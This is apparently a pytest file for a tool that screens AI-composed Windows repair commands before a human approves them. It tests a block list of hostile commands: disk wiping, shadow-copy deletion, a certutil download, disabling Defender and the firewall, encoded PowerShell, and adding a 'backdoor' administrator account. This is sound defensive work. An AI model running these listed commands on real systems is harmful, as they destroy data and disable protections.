"""The refusal list, which is the only thing standing in front of a model.

The reviewed registry is safe for a reason that does not transfer: the command
already existed and a person had read it. A composed command has neither
property, so these tests pin what Warden will not run regardless of how
convincing the explanation beside it is.

The list is not an attempt to decide whether an arbitrary command is safe. That
is undecidable and claiming otherwise would be the exact overreach this project
argues against. It is a list of specific things with no legitimate place in a
diagnosis, refused before a human is ever shown an approve button.
"""

from __future__ import annotations

import inspect

import pytest

from warden.contracts import ExecutionOutcome, utcnow
from warden.executor.freeform import FreeformExecutor, screen


class TestRefusedOutright:
    @pytest.mark.parametrize(
        ("argv", "because"),
        [
            (["format", "C:", "/q"], "wiping a disk"),
            (["diskpart", "/s", "script.txt"], "repartitioning"),
            (["bcdedit", "/set", "safeboot", "minimal"], "boot configuration"),
            (["vssadmin", "delete", "shadows", "/all"], "destroying restore points"),
            (["cipher", "/w:C"], "wiping free space"),
            (["schtasks", "/create", "/tn", "x", "/tr", "y"], "persistence"),
            (["certutil", "-urlcache", "-f", "http://x/y.exe"], "download primitive"),
            (["wmic", "process", "call", "create", "calc"], "execution primitive"),
        ],
    )
    def test_a_refused_program_never_reaches_the_user(self, argv, because) -> None:
        assert screen(argv) is not None, because

    @pytest.mark.parametrize(
        "argv",
        [
            ["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"],
            ["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
            ["powershell", "-EncodedCommand", "ZQBjAGgAbwA="],
            ["net", "user", "backdoor", "P@ss", "/add"],
            ["net", "localgroup", "administrators", "backdoor", "/add"],
        ],
    )
    def test_a_refused_pattern_never_reaches_the_user(self, argv) -> None:
        assert screen(argv) is not None

    def test_a_shell_wrapping_another_command_is_refused_as_a_shape(self) -> None:
        """Not for what it contains. `cmd /c <anything>` hides the real command
        from every check below it, so the shape is refused rather than the
        contents inspected."""
        refusal = screen(["cmd", "/c", "ipconfig", "/all"])
        assert refusal is not None
        assert "hides the real command" in refusal

    def test_an_empty_command_is_refused(self) -> None:
        assert screen([]) is not None

    def test_a_full_path_does_not_evade_the_program_list(self) -> None:
        assert screen([r"C:\Windows\System32\vssadmin.exe", "delete", "shadows"]) is not None


class TestAllowed:
    @pytest.mark.parametrize(
        "argv",
        [
            ["ipconfig", "/flushdns"],
            ["ipconfig", "/all"],
            ["netsh", "int", "ip", "reset"],
            ["netsh", "winsock", "reset"],
            ["sfc", "/scannow"],
            ["dism", "/online", "/cleanup-image", "/restorehealth"],
            ["chkdsk", "C:", "/scan"],
            ["net", "start", "spooler"],
            ["powershell", "-NoProfile", "-File", "check.ps1"],
        ],
    )
    def test_ordinary_repair_commands_are_offered(self, argv) -> None:
        """The list must not be so broad that it refuses the job. Every one of
        these is a real, common Windows repair that the seventeen reviewed
        actions do not cover, and covering them is the entire reason the cloud
        path exists."""
        assert screen(argv) is None


class TestApprovalCannotBeDefaulted:
    def test_approved_at_is_keyword_only_with_no_default(self) -> None:
        """Mirrors tests/test_approval_gate.py for the reviewed runner. If this
        ever grows a default, forgetting it stops being a type error and starts
        being a silent execution."""
        signature = inspect.signature(FreeformExecutor.execute)
        approved = signature.parameters["approved_at"]
        assert approved.kind is inspect.Parameter.KEYWORD_ONLY
        assert approved.default is inspect.Parameter.empty


class TestBlockedRecord:
    def test_a_refusal_produces_a_record_that_never_ran(self) -> None:
        record = FreeformExecutor().execute(
            ["vssadmin", "delete", "shadows", "/all"], approved_at=utcnow()
        )
        assert record.outcome is ExecutionOutcome.BLOCKED
        assert record.exit_code is None
        assert record.started_at is None
        assert record.blocked_reason is not None
        assert "vssadmin" in record.blocked_reason

    def test_the_pattern_list_catches_what_the_program_list_does_not(self) -> None:
        """`netsh` is allowed as a program and is one of the most useful things
        on this list, so switching the firewall off has to be refused on the
        arguments alone."""
        record = FreeformExecutor().execute(
            ["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
            approved_at=utcnow(),
        )
        assert record.outcome is ExecutionOutcome.BLOCKED
        assert record.exit_code is None
        assert record.blocked_reason is not None
        assert "firewall" in record.blocked_reason


class TestPowerShellSwitchResolution:
    """PowerShell resolves a parameter two ways, and an early version of this
    check knew about neither.

    It compared against a literal set, `{"/c", "/k", "-c", "-command"}`. That
    misses every abbreviation, and the abbreviations are not a curiosity: `-ec`
    is the published short form of `-EncodedCommand`, so
    `powershell -ec <base64>` walked past a check whose entire purpose is that
    the person approving can read what will run.

    Prefix matching alone does not close it either, because "encodedcommand"
    does not start with "ec". Both rules are needed and both are pinned here.
    """

    @pytest.mark.parametrize(
        "switch",
        ["-e", "-en", "-enc", "-encod", "-encodedcommand", "-EncodedCommand", "-EC"],
    )
    def test_every_way_of_spelling_encodedcommand_is_refused(self, switch: str) -> None:
        assert screen(["powershell", switch, "ZQBjAGgAbwA="]) is not None

    @pytest.mark.parametrize("switch", ["-c", "-com", "-comm", "-command", "-Command"])
    def test_every_way_of_spelling_command_is_refused(self, switch: str) -> None:
        assert screen(["powershell", switch, "whoami"]) is not None

    @pytest.mark.parametrize("switch", ["/c", "/k", "/C", "/K"])
    def test_cmd_shell_switches_are_refused(self, switch: str) -> None:
        assert screen(["cmd", switch, "dir"]) is not None

    def test_a_script_on_disk_is_still_allowed(self) -> None:
        """-File is deliberately not refused. A script is something the user can
        open and read before approving, which is the property being protected;
        inline code is not."""
        assert screen(["powershell", "-NoProfile", "-File", "check.ps1"]) is None

    def test_execution_policy_is_not_mistaken_for_encodedcommand(self) -> None:
        """Both begin with 'e'. Refusing -ExecutionPolicy would break a common
        and harmless invocation, so the prefix rule must not be greedy."""
        assert screen(["powershell", "-ExecutionPolicy", "Bypass", "-File", "x.ps1"]) is None
